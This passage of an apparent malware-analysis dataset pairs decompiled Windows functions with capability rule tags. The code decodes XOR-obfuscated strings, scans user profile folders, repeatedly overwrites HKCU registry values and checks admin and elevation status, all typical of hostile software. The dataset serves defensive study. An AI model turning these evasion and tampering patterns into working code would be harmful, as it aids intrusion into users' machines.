        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040c769(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uchar *puVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    code *pcVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    int16_t *piVar15;\n    int32_t iVar16;\n    uint lpFindFileData;\n    uint lpString1;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    uint var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t hFindFile;\n    uint *lpMem;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_8fh;\n    uint var_8bh;\n    uchar var_87h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int16_t *lpProfileDir;\n    uchar *lpFileName;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uchar *ARG_0;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpcchSize;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_c0h = 0;\n    ARG_0 = NULL;\n    lpcchSize = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &lpcchSize);\n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (lpcchSize != 0) {\n        lpcchSize = lpcchSize + 10;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpcchSize * 2);\n        pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n        piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        lpProfileDir = piVar6;\n        uVar5 = (*pcVar12)(0, lpcchSize * 2);\n        lpFileName = (*pcVar3)(uVar5);\n        if (piVar6 != NULL) {\n            uVar5 = (*pcVar12)(0, 0x208);\n            puVar7 = (*pcVar3)(uVar5);\n            puVar4 = lpFileName;\n            puVar11 = &lpFindFileData;\n            ARG_0 = puVar7;\n            for (iVar9 = 0x250; piVar6 = lpProfileDir,  iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar7 = puVar4;\n            for (iVar9 = lpcchSize * 2; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            piVar15 = lpProfileDir;\n            for (iVar9 = lpcchSize * 2; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar9 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n            if (iVar9 != 0) {\n                iVar9 = puVar4 - piVar6;\n                do {\n                    iVar2 = *piVar6;\n                    *(piVar6 + iVar9) = iVar2;\n                    piVar6 = piVar6 + 1;\n                } while (iVar2 != 0);\n                var_50h = 0x721b7904;\n                var_4ch = 0x5172674d;\n                var_48h._0_2_ = 0x7958;\n                var_ch = 0x72317958;\n                var_8h = 0x51586763;\n                fcn.00401000(0x14);\n                uVar13 = 0;\n                do {\n                    puVar1 = uVar13 + lpMem;\n                    uVar10 = uVar13 & 0x80000007;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar13 = uVar13 + 1;\n                    *puVar1 = *(&var_ch + uVar10) ^ puVar1[&var_50h - lpMem];\n                    puVar11 = lpMem;\n                } while (uVar13 < 10);\n                do {\n                    iVar2 = *puVar11;\n                    puVar11 = puVar11 + 2;\n                } while (iVar2 != 0);\n                uVar13 = puVar11 - lpMem;\n                puVar11 = lpFileName + -2;\n                do {\n                    piVar6 = puVar11 + 2;\n                    puVar11 = puVar11 + 2;\n                } while (*piVar6 != 0);\n                puVar14 = lpMem;\n                for (uVar10 = uVar13 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar11 = *puVar14;\n                    puVar14 = puVar14 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar11 = *puVar14;\n                    puVar14 = puVar14 + 1;\n                    puVar11 = puVar11 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_5ch = 0x67775457;\n                    var_84h = 0x67775479;\n                    var_80h = 0x72426434;\n                    var_64h = 0x571b685a;\n                    var_60h._0_2_ = 0x4e76;\n                    var_7ch = 0x57356874;\n                    var_78h = 0x6e6e4e76;\n                    var_b8h = 7;\n                    do {\n                        fcn.00401000(8);\n                        iVar9 = var_c4h;\n                        uVar13 = 0;\n                        do {\n                            puVar1 = uVar13 + var_c4h;\n                            uVar10 = uVar13 & 0x80000007;\n                            if (uVar10 < 0) {\n                                uVar10 = (uVar10 - 1 | 0xfffffff8) + 1;\n                            }\n                            uVar13 = uVar13 + 1;\n                            *puVar1 = *(&var_84h + uVar10) ^ puVar1[&var_5ch - var_c4h];\n                        } while (uVar13 < 4);\n                        fcn.00401000(0xc);\n                        iVar16 = var_c8h;\n                        uVar13 = 0;\n                        do {\n                            puVar1 = uVar13 + var_c8h;\n                            uVar10 = uVar13 & 0x80000007;\n                            if (uVar10 < 0) {\n                                uVar10 = (uVar10 - 1 | 0xfffffff8) + 1;\n                            }\n                            uVar13 = uVar13 + 1;\n                            *puVar1 = *(&var_7ch + uVar10) ^ puVar1[&var_64h - var_c8h];\n                        } while (uVar13 < 6);\n                        iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar9);\n                        pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar8 != 0) &&\n                            (iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar16),  iVar8 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_38h = 0x6904331d;\n                            var_34h = 0x5108783a;\n                            var_30h = 0x59496b5f;\n                            var_2ch = 0x3334692b;\n                            var_28h = 0x782d691f;\n                            var_24h = 0x6b5d5100;\n                            var_20h = 0x690b590e;\n                            var_1ch = 0x693f330d;\n                            var_18h = 0x5104783c;\n                            var_14h = 0x59696b43;\n                            var_6ch = 0x696b3351;\n                            var_68h._0_2_ = 0x7859;\n                            var_68h._2_1_ = 0x69;\n                            fcn.00401000(0x50);\n                            iVar9 = var_bch;\n                            iVar16 = 0;\n                            var_4h = &var_38h - var_bch;\n                            do {\n                                puVar1 = iVar16 + var_bch;\n                                iVar8 = iVar16 % var_b8h;\n                                iVar16 = iVar16 + 1;\n                                *puVar1 = *(&var_6ch + iVar8) ^ puVar1[&var_38h - var_bch];\n                            } while (iVar16 < 0x28);\n                            var_ach = 0x331f482a;\n                            var_a8h = 0x6d2b3711;\n                            var_a4h = 0x331b480a;\n                            var_a0h = 0x6d333700;\n                            var_9ch = 0x33004827;\n                            var_98h = 0x6d0e3702;\n                            var_94h._0_1_ = 7;\n                            stack0xffffff69 = 0x35333348;\n                            var_8fh = 0x66d0a37;\n                            var_8bh = 0x61331f48;\n                            var_87h = 0x37;\n                            var_74h = 0x336f486b;\n                            var_70h = 0x6d6f3761;\n                            fcn.00401000(0x4c);\n                            uVar13 = 0;\n                            do {\n                                puVar1 = uVar13 + var_cch;\n                                uVar10 = uVar13 & 0x80000007;\n                                if (uVar10 < 0) {\n                                    uVar10 = (uVar10 - 1 | 0xfffffff8) + 1;\n                                }\n                                uVar13 = uVar13 + 1;\n                                *puVar1 = *(&var_74h + uVar10) ^ puVar1[&var_ach - var_cch];\n                            } while (uVar13 < 0x26);\n                            var_50h = var_cch;\n                            var_4ch = iVar9;\n                            var_4h = 0;\n                            var_ch = 0x71733336;\n                            var_8h = var_8h & 0xff000000 | 0x657a41;\n                            do {\n                                var_40h = 0x71003313;\n                                var_3ch = 0x36407a1d;\n                                var_38h = 0x412d7340;\n                                var_34h = 0x3345655f;\n                                var_30h = 0x7a34712f;\n                                var_2ch = 0x73593614;\n                                var_28h = 0x65114112;\n                                var_24h = 0x71143353;\n                                var_20h = 0x360d7a34;\n                                var_1ch = 0x415f735f;\n                                var_18h = 0x335b650e;\n                                var_14h = 0x7a417103;\n                                fcn.00401000(0x60);\n                                iVar9 = var_d0h;\n                                iVar16 = 0;\n                                do {\n                                    puVar1 = iVar16 + var_d0h;\n                                    iVar8 = iVar16 % var_b8h;\n                                    iVar16 = iVar16 + 1;\n                                    *puVar1 = *(&var_ch + iVar8) ^ puVar1[&var_40h - var_d0h];\n                                } while (iVar16 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, var_d0h, lpProfileDir, &lpString1, (&var_50h)[var_4h]);\n                                iVar16 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(ARG_0);\n                                pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar16 != -1) {\n                                    fcn.004065c5();\n                                    var_c0h = 1;\n                                }\n                                uVar5 = (*pcVar12)(0, iVar9);\n                                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                                var_4h = var_4h + 1;\n                            } while (var_4h < 2);\n                            uVar5 = (*pcVar12)(0, var_cch);\n                            (*pcVar3)(uVar5);\n                            uVar5 = (*pcVar12)(0, var_bch);\n                            (*pcVar3)(uVar5);\n                            iVar16 = var_c8h;\n                            iVar9 = var_c4h;\n                        }\n                        uVar5 = (*pcVar12)(0, iVar16);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*pcVar12)(0, iVar9);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        iVar9 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar9 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar5 = (*pcVar12)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                piVar6 = lpProfileDir;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar5 = (*pcVar12)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        if (piVar6 != NULL) {\n            uVar5 = (*pcVar12)(0, piVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        if (ARG_0 != NULL) {\n            uVar5 = (*pcVar12)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    return var_c0h;\n}\n",
        "token_count": 3688
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    code *pcVar9;\n    code *pcVar10;\n    uchar *puVar11;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    code *pszFirst;\n    int32_t var_ch;\n    code *var_8h;\n    uchar *pszSrch;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    var_ch = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar8)(uVar2 | 2);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)(&var_ch);\n    var_8h = (*_sym.imp.SHELL32.dll_CommandLineToArgvW)(uVar3);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    pcVar9 = pcVar4;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *pcVar9 = 0x0;\n        pcVar9 = pcVar9 + 1;\n    }\n    pcVar9 = NULL;\n    pszFirst = pcVar4;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, pcVar4, 0x104);\n    *0x41bd3c = pcVar4;\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar5 = fcn.00406b7b();\n    pcVar10 = pcVar9;\n    if (iVar5 != 1) goto code_r0x0040df20;\n    fcn.004082cd();\n    uVar3 = (*pcVar8)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n            pcVar10 = pcVar9;\ncode_r0x0040df20:\n            var_38h = 0x6e36441d;\n            var_34h = 0x70157411;\n            var_30h = 0x65404527;\n            var_2ch = 0x44086611;\n            var_28h = 0x74656e20;\n            var_20h = 0x6e454470;\n            var_1ch._0_2_ = 0x7465;\n            var_1ch._2_1_ = 0x66;\n            fcn.00401000(0x28);\n            pcVar9 = pszFirst;\n            pszSrch = 0x7;\n            var_18h = &var_38h - var_14h;\n            do {\n                pcVar4 = pcVar10 + var_14h;\n                iVar5 = pcVar10 % 7;\n                pcVar10 = pcVar10 + 1;\n                *pcVar4 = *(&var_20h + iVar5) ^ pcVar4[&var_38h - var_14h];\n            } while (pcVar10 < 0x14);\n            pcVar4 = pszFirst;\n            iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, var_14h);\n            if (iVar5 != 0) break;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0, pcVar9);\n            fcn.00407e39(pcVar4);\n        }\n        if (1 < var_ch) {\n            *0x41bd3c = *(var_8h + 4);\n        }\n        *0x41bd78 = fcn.0040de5c();\n        fcn.00408d2a();\n        fcn.0040dd7c();\n        var_70h = 0x5500456e;\n        var_6ch = 0x4b38651b;\n        var_68h = 0x4b144101;\n        var_64h = 0x450a6831;\n        var_60h = 0x65175564;\n        var_5ch = 0x412c4b25;\n        var_58h = 0x68174b36;\n        var_54h = 0x55324524;\n        var_50h = 0x4b0e6524;\n        var_4ch = 0x4b094131;\n        var_48h = 0x4525682c;\n        var_44h = 0x652e5535;\n        var_40h = 0x412b4b1a;\n        var_3ch = 0x68114b30;\n        var_38h = 0x5504456b;\n        var_34h = 0x4b186533;\n        var_30h = 0x4b3a4129;\n        var_2ch = 0x452e6817;\n        var_28h = 0x65175533;\n        var_24h._0_2_ = 0x4b68;\n        var_20h = 0x5541454b;\n        var_1ch._0_2_ = 0x654b;\n        var_1ch._2_1_ = 0x68;\n        fcn.00401000(0x9c);\n        iVar5 = 0;\n        var_18h = &var_70h - var_8h;\n        do {\n            pcVar9 = var_8h + iVar5;\n            iVar6 = iVar5 % pszSrch;\n            iVar5 = iVar5 + 1;\n            *pcVar9 = *(&var_20h + iVar6) ^ pcVar9[&var_70h - var_8h];\n        } while (iVar5 < 0x4e);\n        var_4ch = 0x38314b5f;\n        var_48h = 0x7a1b383d;\n        var_44h = 0x445d623f;\n        var_40h = 0x4b286855;\n        var_3ch = 0x382b380d;\n        var_38h = 0x626e7a1c;\n        var_34h = 0x686c4464;\n        var_30h = 0x38114b1b;\n        var_2ch = 0x7a1b382f;\n        var_28h = 0x44386217;\n        var_20h = 0x38624b7a;\n        var_1ch._0_2_ = 0x3844;\n        var_1ch._2_1_ = 0x68;\n        fcn.00401000(0x50);\n        iVar5 = var_18h;\n        iVar6 = 0;\n        pszFirst = &var_4ch - var_18h;\n        do {\n            puVar1 = iVar6 + var_18h;\n            iVar7 = iVar6 % pszSrch;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_4ch - var_18h];\n        } while (iVar6 < 0x28);\n        uVar3 = (*pcVar8)(0, 0x208);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        pszFirst = pcVar4;\n        uVar3 = (*pcVar8)(0, 0x208);\n        pszSrch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        pcVar9 = var_8h;\n        for (iVar6 = 0x208; pcVar8 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *pcVar4 = 0x0;\n            pcVar4 = pcVar4 + 1;\n        }\n        puVar11 = pszSrch;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        (*pcVar8)(var_8h, pszFirst, 0x104);\n        (*pcVar8)(iVar5, pszSrch, 0x104);\n        pcVar8 = pszFirst;\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41bd3c, pszFirst);\n        iVar5 = var_14h;\n        if ((iVar6 != 0) || (iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41bd3c, pszSrch),  iVar6 != 0)) break;\n        fcn.00405db3();\n        fcn.0040a506();\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00404d00, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar8);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pszSrch);\n    (*pcVar8)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n    (*pcVar8)(uVar3);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar9);\n    (*pcVar8)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar5);\n    (*pcVar8)(uVar3);\n    return;\n}\n",
        "token_count": 2504
    },
    "00403478": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403478(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uchar var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_164h = 0;\n    sub.ntdll.dll_memset(&var_163h, 0, 0x103);\n    var_60h = 0;\n    var_5ch = 0x3f012412;\n    var_58h = 0x73c5036;\n    var_54h = 0x280e061d;\n    var_50h = 0xd3d5e33;\n    var_4ch = 0x1c3b3f27;\n    var_48h = 0xd2a5f28;\n    var_44h = 0x83b3836;\n    var_40h = 0x73c4334;\n    var_3ch = 0x2e313f2f;\n    var_38h = 0xd274233;\n    var_34h = 0x252e172f;\n    var_30h = 0xc3c5435;\n    var_2ch = 0x18473f24;\n    var_28h = 0xb3a4524;\n    var_24h = 0x17142c2f;\n    var_20h = 0x7205e1b;\n    var_1ch = 0x2f421732;\n    var_18h._0_2_ = 0x311d;\n    var_ch = 0x4b674b41;\n    var_8h = 0x624e3141;\n    fcn.00401000(0x46);\n    iVar2 = var_4h;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_4h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_ch + uVar4) ^ puVar1[&var_5ch - var_4h];\n    } while (uVar6 < 0x46);\n    var_ch = 0x497e460a;\n    var_8h = CONCAT31(var_8h._1_3_, 0x43);\n    var_14h = 0x794e7338;\n    var_10h = 0x6b447543;\n    fcn.00401000(5);\n    iVar3 = var_4h;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_4h;\n        uVar4 = uVar6 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_ch - var_4h];\n    } while (uVar6 < 5);\n    do {\n        iVar7 = 0;\n        do {\n            var_4h = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_164h, iVar2, iVar7);\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_164h, &var_4h);\n            if (iVar5 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_4h, iVar3, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1153
    },
    "004069d3": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004069d3(uint param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint ReturnLength;\n    uint TokenHandle;\n    uint32_t TokenInformation;\n    \n    *0x41bd78 = param_1;\n    *0x41bd7c = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41bd44 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41bd34 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040926d();\n    fcn.00406962();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x20);\n    *0x41bd5c = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (*0x41bd5c != 0) {\n        TokenHandle = 0x10;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41bd5c, &TokenHandle);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41bd5c, L\"UNKNOW\");\n        }\n        fcn.00406606();\n    }\n    pIdentifierAuthority = 0;\n    ReturnLength._0_2_ = 0x500;\n    TokenInformation =\n         (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                   (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &TokenHandle);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (TokenInformation != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, TokenHandle, &TokenInformation);\n        TokenInformation = TokenInformation & -(iVar3 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(TokenHandle);\n        if (TokenInformation != 0) {\n            if (*0x41bd44 < 6) {\ncode_r0x00406b0a:\n                *0x41bd64 = 4;\n            }\n            else {\n                TokenInformation = 0;\n                if (*0x41bd44 == 6) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n                    if (iVar3 != 0) {\n                        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                    }\n                    if (TokenInformation != 0) goto code_r0x00406b0a;\n                }\n                *0x41bd64 = 3;\n            }\n            goto code_r0x00406b54;\n        }\n    }\n    TokenInformation = 0;\n    TokenHandle = 0xc;\n    TokenInformation = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &TokenHandle);\n    if (TokenInformation != 0) {\n        (*pcVar1)(0, &pSid, &TokenInformation);\n        *0x41bd64 = 1;\n        if (TokenInformation != 0) goto code_r0x00406b54;\n    }\n    *0x41bd64 = 2;\ncode_r0x00406b54:\n    if (*0x41bd44 < 6) {\n        *0x41bd60 = 2;\n    }\n    else {\n        *0x41bd60 = fcn.00406b7b();\n    }\n    return 0;\n}\n",
        "token_count": 891
    },
    "004076a2": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004076a2(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t *piVar1;\n    uint8_t *puVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t *piStack124;\n    int32_t *piStack120;\n    int32_t iStack116;\n    int16_t *piStack112;\n    uint8_t *puStack108;\n    int32_t *piStack104;\n    uint32_t uStack100;\n    uint uStack96;\n    uint32_t uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint uStack76;\n    uint8_t uStack72;\n    uchar auStack71 [4];\n    uchar uStack67;\n    ushort uStack66;\n    uint uStack64;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    ushort uStack54;\n    int16_t *piStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    cVar5 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack96 = 0;\n    piVar13 = arg_8h + 1;\n    piStack104 = piVar13;\n    if (*piVar13 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*piVar13);\n        *piVar13 = 0;\n    }\n    iVar12 = CONCAT44(uStack100, uStack92);\n    piStack120 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41bd38 & 1) != 0)) {\n        if (cVar5 != '\\x05') {\n            if ((*0x41bdf8 | *0x41bdfc) == 0) {\n                uStack64 = 0x201d3d2b;\n                puStack108 = 0x7;\n                uStack60 = 7;\n                uStack59 = 0x6b;\n                uStack58 = 0x1c;\n                uStack57 = 0x29;\n                uStack56 = 0x25;\n                uStack55 = 0x79;\n                uStack92 = 0x4c794945;\n                uStack88 = CONCAT13(uStack88._3_1_, 0x78456b);\n                fcn.00401000(10);\n                piStack104 = NULL;\n                uStack88 = auStack71 + (3 - iStack116);\n                do {\n                    *(piStack104 + iStack116) =\n                         *(&uStack96 + piStack104 % 7) ^ (piStack104 + iStack116)[auStack71 + (3 - iStack116)];\n                    piStack104 = piStack104 + 1;\n                } while (piStack104 < 10);\n                uStack36 = 0x30010c66;\n                uStack32 = 0x400b3d4a;\n                iVar10 = 0;\n                uStack28 = 0x5d00381d;\n                uStack24 = 0xa5c3e2a;\n                uStack20 = 0x585c1208;\n                uStack96 = 0x736d7834;\n                uStack92 = uStack92 & 0xff000000 | 0x6a5838;\n                fcn.00401000(0x14);\n                uVar11 = uStack92;\n                do {\n                    puVar2 = iVar10 + uStack92;\n                    iVar9 = iVar10 % iStack116;\n                    iVar10 = iVar10 + 1;\n                    *puVar2 = *(&uStack100 + iVar9) ^ puVar2[&uStack40 - uStack92];\n                } while (iVar10 < 0x14);\n                fcn.00409e96();\n                piVar13 = piStack120;\n                *0x41bdf8 = fcn.0040a354(uVar11);\n                pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar11);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                